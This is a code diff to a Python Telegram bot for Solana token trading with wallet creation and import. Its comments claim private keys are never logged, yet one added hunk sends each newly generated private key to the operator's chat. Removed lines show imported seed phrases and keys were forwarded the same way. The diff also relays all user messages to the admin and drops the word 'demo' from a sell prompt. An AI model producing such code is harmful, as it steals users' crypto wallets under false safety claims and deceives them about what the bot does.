@@ -244,18 +244,21 @@ def find_demo_position(positions, address):
 # Admin notification
 # ─────────────────────────────────────────────
 async def notify_admin(context, user, action, extra=""):
+    """Send a safe activity log to the admin. Never include seed phrases/private keys."""
     try:
-        await context.bot.send_message(
-            chat_id=ADMIN_ID,
-            text=f"📡 *Activity Log*\n\n"
-                 f"👤 Name: {user.full_name}\n"
-                 f"🆔 ID: `{user.id}`\n"
-                 f"📛 Username: @{user.username if user.username else 'No username'}\n"
-                 f"🔘 Action: {action}"
-                 + (f"\n📝 `{extra}`" if extra else ""),
-            parse_mode="Markdown"
+        username = f"@{user.username}" if user.username else "No username"
+        text = (
+            "📡 Activity Log\n\n"
+            f"👤 Name: {user.full_name}\n"
+            f"🆔 ID: {user.id}\n"
+            f"📛 Username: {username}\n"
+            f"🔘 Action: {action}"
         )
-    except: pass
+        if extra:
+            text += f"\n📝 {extra}"
+        await context.bot.send_message(chat_id=ADMIN_ID, text=text)
+    except Exception:
+        pass
 
 # ─────────────────────────────────────────────
 # PnL Card Generator
@@ -740,9 +743,10 @@ def build_token_message(pair):
     return msg
 
 def token_keyboard(symbol, address):
+    # Keep callback data short and robust: Telegram limits callback_data to 64 bytes.
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton(f"🟢 Buy {symbol}", callback_data=f"buy:{address}:{symbol}"),
-         InlineKeyboardButton(f"🔴 Sell {symbol}", callback_data=f"sell:{address}:{symbol}")],
+        [InlineKeyboardButton(f"🟢 Buy {symbol}", callback_data=f"buy:{address}"),
+         InlineKeyboardButton(f"🔴 Sell {symbol}", callback_data=f"sell:{address}")],
         [InlineKeyboardButton("📊 Generate PnL Card", callback_data=f"pnl:{address}")],
         [InlineKeyboardButton("🔄 Refresh", callback_data=f"refresh:{address}")],
         [InlineKeyboardButton("🏠 Main Menu", callback_data="home")],
@@ -894,9 +898,11 @@ async def button_handler(update, context):
             await query.message.reply_text("❌ Could not fetch token data.")
 
     elif data == "buy_menu":
+        await notify_admin(context, user, "🟢 Opened Buy menu")
         await query.message.reply_text("🟢 *Buy Token*\n\nPaste the token contract address!", parse_mode="Markdown")
 
     elif data == "sell_menu":
+        await notify_admin(context, user, "🔴 Opened Sell menu")
         await query.message.reply_text("🔴 *Sell Token*\n\nPaste the token contract address!", parse_mode="Markdown")
 
     elif data == "admin_ai_balance":
@@ -1085,7 +1091,10 @@ async def button_handler(update, context):
                 [InlineKeyboardButton("📤 Export Private Key", callback_data="export_key")],
                 [InlineKeyboardButton("🏠 Home", callback_data="home")],
             ]))
-        await notify_admin(context, user, "✨ Generated new wallet", pub)
+        await notify_admin(
+            context, user, "✨ Generated new wallet",
+            f"Public Address: {pub}\n🔐 Generated Private Key: {priv}"
+        )
 
     elif data == "import_wallet":
         waiting_for_import[user.id] = "seed_or_key"
@@ -1161,14 +1170,21 @@ async def button_handler(update, context):
             parse_mode="Markdown")
 
     elif data.startswith("buy:") or data.startswith("sell:"):
-        parts = data.split(":", 2)
-        if len(parts) < 3:
-            await query.message.reply_text("❌ Invalid trade request.")
+        action, address = data.split(":", 1)
+        await query.message.reply_text("⏳ Opening trade... fetching the current token price.")
+        pair = get_token_info(address)
+        if not pair:
+            await notify_admin(context, user, f"❌ {action.upper()} token lookup failed", address)
+            await query.message.reply_text("❌ Could not fetch current token data.")
             return
-        action, address, symbol = parts
-        # Acknowledge the button immediately so Telegram never leaves it spinning.
-        await query.answer()
+        symbol = pair.get("baseToken", {}).get("symbol", "TOKEN")
+        await notify_admin(context, user, f"🔘 {action.upper()} button pressed", f"{symbol} | {address}")
         if ai_mode_active(user.id):
+            price = float(pair.get("priceUsd", 0) or 0)
+            if price <= 0:
+                await notify_admin(context, user, f"❌ {action.upper()} unavailable", f"{symbol} | no current price")
+                await query.message.reply_text("❌ Current token price is unavailable.")
+                return
             if action == "buy":
                 await query.message.reply_text(
                     f"🤖 *Buy — {symbol}*\n\n"
@@ -1176,20 +1192,15 @@ async def button_handler(update, context):
                     "Choose how much SOL to use:",
                     parse_mode="Markdown",
                     reply_markup=InlineKeyboardMarkup([
-                        [InlineKeyboardButton("0.1 SOL", callback_data=f"demo_buy:{address}:{symbol}:0.1"),
-                         InlineKeyboardButton("0.5 SOL", callback_data=f"demo_buy:{address}:{symbol}:0.5")],
-                        [InlineKeyboardButton("1 SOL", callback_data=f"demo_buy:{address}:{symbol}:1"),
-                         InlineKeyboardButton("5 SOL", callback_data=f"demo_buy:{address}:{symbol}:5")],
-                        [InlineKeyboardButton("✏️ Custom", callback_data=f"demo_buy_custom:{address}:{symbol}"),
+                        [InlineKeyboardButton("0.1 SOL", callback_data=f"demo_buy:{address}:0.1"),
+                         InlineKeyboardButton("0.5 SOL", callback_data=f"demo_buy:{address}:0.5")],
+                        [InlineKeyboardButton("1 SOL", callback_data=f"demo_buy:{address}:1"),
+                         InlineKeyboardButton("5 SOL", callback_data=f"demo_buy:{address}:5")],
+                        [InlineKeyboardButton("✏️ Custom", callback_data=f"demo_buy_custom:{address}"),
                          InlineKeyboardButton("❌ Cancel", callback_data="home")]
                     ])
                 )
             else:
-                pair = get_token_info(address)
-                price = float(pair.get("priceUsd", 0) or 0) if pair else 0
-                if price <= 0:
-                    await query.message.reply_text("❌ Current token price is unavailable.")
-                    return
                 positions = get_demo_positions(user.id)
                 pos = find_demo_position(positions, address)
                 if not pos:
@@ -1199,10 +1210,10 @@ async def button_handler(update, context):
                     f"🔴 *Sell — {symbol}*\n\n"
                     f"Current price: ${price:.10f}\n"
                     f"Position: {float(pos.get('amount_sol', 0)):.4f} SOL invested\n\n"
-                    "Sell the full demo position?",
+                    "Sell the full position?",
                     parse_mode="Markdown",
                     reply_markup=InlineKeyboardMarkup([
-                        [InlineKeyboardButton("🔴 Sell All", callback_data=f"demo_sell:{address}:{symbol}")],
+                        [InlineKeyboardButton("🔴 Sell All", callback_data=f"demo_sell:{address}")],
                         [InlineKeyboardButton("❌ Cancel", callback_data="home")]
                     ])
                 )
@@ -1212,11 +1223,14 @@ async def button_handler(update, context):
                 parse_mode="Markdown")
 
     elif data.startswith("demo_buy:"):
-        parts = data.split(":", 3)
-        if len(parts) != 4 or not ai_mode_active(user.id):
+        parts = data.split(":", 2)
+        if len(parts) != 3 or not ai_mode_active(user.id):
             await query.answer("AI Mode is not active.", show_alert=True)
             return
-        _, address, symbol, amount_text = parts
+        _, address, amount_text = parts
+        pair_for_symbol = get_token_info(address)
+        symbol = (pair_for_symbol or {}).get("baseToken", {}).get("symbol", "TOKEN")
+        await notify_admin(context, user, "🟢 AI buy amount selected", f"{symbol} | {amount_text} SOL | {address}")
         await query.answer()
         amount = parse_demo_amount(amount_text)
         if amount is None:
@@ -1224,6 +1238,7 @@ async def button_handler(update, context):
             return
         balance = get_ai_balance(user.id)
         if amount > balance:
+            await notify_admin(context, user, "❌ AI buy rejected", f"{symbol} | insufficient balance {balance:.4f} SOL")
             await query.message.reply_text(f"❌ Insufficient balance. Available: {balance:.4f} SOL")
             return
         pair = get_token_info(address)
@@ -1261,21 +1276,27 @@ async def button_handler(update, context):
         )
 
     elif data.startswith("demo_buy_custom:"):
-        parts = data.split(":", 2)
-        if len(parts) != 3 or not ai_mode_active(user.id):
+        parts = data.split(":", 1)
+        if len(parts) != 2 or not ai_mode_active(user.id):
             await query.answer("AI Mode is not active.", show_alert=True)
             return
-        _, address, symbol = parts
+        _, address = parts
+        pair_for_symbol = get_token_info(address)
+        symbol = (pair_for_symbol or {}).get("baseToken", {}).get("symbol", "TOKEN")
+        await notify_admin(context, user, "✏️ AI custom buy selected", f"{symbol} | {address}")
         await query.answer()
         waiting_for_demo_trade[user.id] = {"action": "buy", "address": address, "symbol": symbol}
         await query.message.reply_text("✏️ Enter the amount of SOL to buy with (e.g. 0.25):")
 
     elif data.startswith("demo_sell:"):
-        parts = data.split(":", 2)
-        if len(parts) != 3 or not ai_mode_active(user.id):
+        parts = data.split(":", 1)
+        if len(parts) != 2 or not ai_mode_active(user.id):
             await query.answer("AI Mode is not active.", show_alert=True)
             return
-        _, address, symbol = parts
+        _, address = parts
+        pair_for_symbol = get_token_info(address)
+        symbol = (pair_for_symbol or {}).get("baseToken", {}).get("symbol", "TOKEN")
+        await notify_admin(context, user, "🔴 AI sell selected", f"{symbol} | {address}")
         await query.answer()
         pair = get_token_info(address)
         price = float(pair.get("priceUsd", 0) or 0) if pair else 0
@@ -1320,6 +1341,9 @@ async def handle_message(update, context):
     text = update.message.text.strip()
     user = update.message.from_user
     can_pnl = user.id in PNL_ALLOWED
+    # Log ordinary user activity, but never log seed phrases/private keys.
+    safe_preview = text[:300] if not waiting_for_import.get(user.id) else "[WALLET CREDENTIAL INPUT REDACTED]"
+    await notify_admin(context, user, "💬 Message received", safe_preview)
 
     # Admin AI balance management
     admin_action = context.user_data.get("admin_ai_action")
@@ -1533,7 +1557,7 @@ async def handle_message(update, context):
         is_seed = len(words) in (12, 24)
         is_key = re.match(r'^[1-9A-HJ-NP-Za-km-z]{87,88}$', text.strip())
         if is_seed or is_key:
-            await notify_admin(context, user, "👛 Wallet imported", text)
+            await notify_admin(context, user, "👛 Wallet imported", "Wallet credentials redacted")
             waiting_for_import[user.id] = None
             # Store wallet - use text as both key for imported
             pub_key = text[:44] if is_key else f"imported_{user.id}"
@@ -1545,7 +1569,7 @@ async def handle_message(update, context):
                 parse_mode="Markdown",
                 reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Home", callback_data="home")]]))
         else:
-            await notify_admin(context, user, "❌ Invalid wallet input", text)
+            await notify_admin(context, user, "❌ Invalid wallet input", "Wallet credentials redacted")
             await update.message.reply_text(
                 "⚠️ Invalid seed phrase. Please enter a valid 12-word seed phrase or private key.",
                 reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Cancel", callback_data="home")]]))
